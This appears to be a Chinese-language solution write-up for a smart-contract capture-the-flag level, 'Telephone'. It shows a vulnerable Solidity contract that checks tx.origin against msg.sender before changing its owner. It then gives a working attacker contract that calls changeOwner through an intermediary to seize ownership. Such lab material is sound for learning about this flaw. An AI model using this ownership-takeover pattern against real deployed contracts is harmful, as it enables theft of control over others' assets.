#   Level 4 Telephone
實例地址：`0x5552ee9E96f334773e9A7900f23b287aa7335363`

##  題目說明
取得下面合約的所有權，來完成這一關。

可能會有用的資訊
*   參閱幫助頁面 "Beyond the console" 章節

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```
##  POC
轉換 owner 條件，需要 `tx.origin` 不等於 `msg.sender`，所以需要撰寫一個攻擊合約呼叫原合約達成不等於條件。

`tx.origin` : 最初交易創建者

`msg.sender` : 合約呼叫者

### 攻擊者合約
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface Telephone{
    function changeOwner(address _owner) external;
}

contract Attack{
    address public target;

    constructor(address _target){
        target = _target;
    }

    function attack() public{
        Telephone(target).changeOwner(msg.sender);
    }
}
```
